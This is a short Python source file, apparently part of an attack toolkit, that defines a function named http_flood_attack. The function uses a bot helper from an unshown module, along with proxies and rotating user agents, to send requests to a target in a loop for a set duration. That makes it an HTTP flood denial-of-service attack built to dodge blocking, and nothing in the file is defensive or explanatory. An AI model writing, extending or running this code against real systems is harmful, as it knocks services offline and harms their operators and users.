import time
from utils.http_bot import HTTPBot

def http_flood_attack(target, proxies, user_agents, duration):
    bot = HTTPBot(proxies, user_agents)
    end_time = time.time() + duration
    while time.time() < end_time:
        bot.send_request(target)
        time.sleep(0.1)  
